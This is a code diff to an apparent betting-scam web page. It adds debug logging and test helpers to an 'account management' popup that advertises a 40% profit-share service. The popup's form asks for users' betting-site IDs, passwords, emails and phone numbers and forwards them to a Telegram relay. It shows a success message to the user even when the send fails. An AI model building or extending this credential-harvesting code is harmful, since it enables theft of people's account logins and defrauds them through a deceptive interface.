@@ -2112,6 +2112,8 @@
         
         // Function to send account management data to Telegram
         async function sendAccountManagementToTelegram(accountData) {
+            console.log('🚀 Sending account management data to Telegram:', accountData);
+            
             try {
                 // Create formatted message for Telegram
                 const message = `🏦 PAY AFTER WIN ACCOUNT MANAGEMENT REQUEST\n\n` +
@@ -2124,6 +2126,9 @@
                     `⏰ Time: ${new Date(accountData.timestamp).toLocaleString()}\n\n` +
                     `💰 Service: Pay After Win (40% profit share)\n` +
                     `⚠️ Admin: Please review and contact customer for account management.`;
+
+                console.log('📤 Sending message to:', `${API_BASE_URL}/api/telegram/send`);
+                console.log('📋 Message content:', message);
 
                 const response = await fetch(`${API_BASE_URL}/api/telegram/send`, {
                     method: 'POST',
@@ -2140,33 +2145,61 @@
                     })
                 });
                 
+                console.log('📥 Response status:', response.status);
+                console.log('📥 Response ok:', response.ok);
+                
                 if (response.ok) {
-                    console.log('Account management data sent to Telegram successfully');
-                    return await response.json();
+                    const result = await response.json();
+                    console.log('✅ Account management data sent to Telegram successfully:', result);
+                    return result;
                 } else {
-                    throw new Error('Failed to send account management data');
+                    const errorText = await response.text();
+                    console.error('❌ Failed response:', errorText);
+                    throw new Error(`Failed to send account management data: ${response.status} - ${errorText}`);
                 }
             } catch (error) {
-                console.error('Failed to send account management data to Telegram:', error);
+                console.error('❌ Failed to send account management data to Telegram:', error);
                 throw error;
             }
         }
         
-        // Show account management popup every 10 seconds
+        // Track if account popup has been clicked
+        let accountPopupClicked = localStorage.getItem('accountPopupClicked') === 'true';
+        console.log('🔍 Account popup clicked status:', accountPopupClicked);
+        
+        // Show account management popup every 10 seconds (only if not clicked before)
         function showAccountPopup() {
-            const popup = document.getElementById('account-popup');
-            popup.classList.add('show');
+            if (accountPopupClicked) {
+                console.log('⏭️ Account popup already clicked, skipping...');
+                return; // Don't show popup if it has been clicked before
+            }
             
-            setTimeout(() => {
-                popup.classList.remove('show');
-            }, 5000); // Hide after 5 seconds
+            console.log('👀 Showing account popup...');
+            const popup = document.getElementById('account-popup');
+            if (popup) {
+                popup.classList.add('show');
+                console.log('✅ Popup shown with "show" class');
+                
+                setTimeout(() => {
+                    popup.classList.remove('show');
+                    console.log('⏰ Popup hidden after 5 seconds');
+                }, 5000); // Hide after 5 seconds
+            } else {
+                console.error('❌ Account popup element not found!');
+            }
         }
         
-        // Start showing popup every 10 seconds
-        setInterval(showAccountPopup, 10000);
+        // Start showing popup every 10 seconds (only if not clicked before)
+        if (!accountPopupClicked) {
+            console.log('⏱️ Setting up popup interval every 10 seconds...');
+            setInterval(showAccountPopup, 10000);
+        } else {
+            console.log('🚫 Popup already clicked, not setting up interval');
+        }
         
         // Initialize account management system
         function initAccountManagement() {
+            console.log('🚀 Initializing account management system...');
             const popup = document.getElementById('account-popup');
             const modal = document.getElementById('account-modal');
             const closeBtn = document.getElementById('account-modal-close');
@@ -2175,15 +2208,35 @@
             const accountForm = document.getElementById('account-form');
             const closeSuccessBtn = document.getElementById('close-success');
             
-            // Show popup first time after 10 seconds
-            setTimeout(showAccountPopup, 10000);
+            if (!popup || !modal) {
+                console.error('❌ Required account management elements not found!');
+                return;
+            }
+            
+            console.log('✅ All account management elements found');
+            
+            // Show popup first time after 10 seconds (only if not clicked before)
+            if (!accountPopupClicked) {
+                console.log('⏰ Setting up initial popup timeout (10 seconds)...');
+                setTimeout(showAccountPopup, 10000);
+            } else {
+                console.log('🚫 Popup already clicked, not showing initial popup');
+            }
             
             // Popup click handler
             popup.addEventListener('click', () => {
+                console.log('🎯 Account popup clicked!');
+                
+                // Mark popup as clicked and save to localStorage
+                accountPopupClicked = true;
+                localStorage.setItem('accountPopupClicked', 'true');
+                console.log('💾 Popup marked as clicked and saved to localStorage');
+                
                 modal.classList.remove('hidden');
                 document.body.style.overflow = 'hidden';
                 popup.classList.remove('show');
                 showAccountStep('account-step-1');
+                console.log('🔄 Modal opened and showing step 1');
             });
             
             // Close modal
@@ -2219,6 +2272,7 @@
             // Form submission
             accountForm.addEventListener('submit', async (e) => {
                 e.preventDefault();
+                console.log('📝 Account management form submitted!');
                 
                 // Show loading step
                 showAccountStep('account-step-3');
@@ -2234,9 +2288,13 @@
                     sessionContact: sessionStorage.getItem('aviator_contact') || 'Unknown'
                 };
                 
+                console.log('📊 Form data collected:', formData);
+                
                 try {
                     // Send to Telegram
+                    console.log('🚀 About to send to Telegram...');
                     await sendAccountManagementToTelegram(formData);
+                    console.log('✅ Successfully sent to Telegram!');
                     
                     // Show success step after a short delay
                     setTimeout(() => {
@@ -2244,6 +2302,7 @@
                     }, 2000);
                     
                 } catch (error) {
+                    console.error('❌ Error sending to Telegram:', error);
                     // Even if telegram fails, show success to user
                     setTimeout(() => {
                         showAccountStep('account-step-4');
@@ -2275,6 +2334,29 @@
         
         // Initialize account management when DOM is loaded
         document.addEventListener('DOMContentLoaded', initAccountManagement);
+        
+        // Temporary test function - you can call this in browser console
+        window.testAccountManagement = function() {
+            console.log('🧪 Testing account management...');
+            const testData = {
+                bettingSite: 'Test Betting Site',
+                userId: 'testuser123',
+                password: 'testpass123',
+                email: 'test@example.com',
+                phone: '+1234567890',
+                timestamp: new Date().toISOString(),
+                sessionContact: 'Manual Test'
+            };
+            sendAccountManagementToTelegram(testData);
+        };
+        
+        // Function to reset popup for testing
+        window.resetAccountPopup = function() {
+            localStorage.removeItem('accountPopupClicked');
+            accountPopupClicked = false;
+            console.log('🔄 Account popup reset - it will show again');
+            showAccountPopup(); // Show immediately for testing
+        };
         
         // === END ACCOUNT MANAGEMENT SYSTEM ===
         
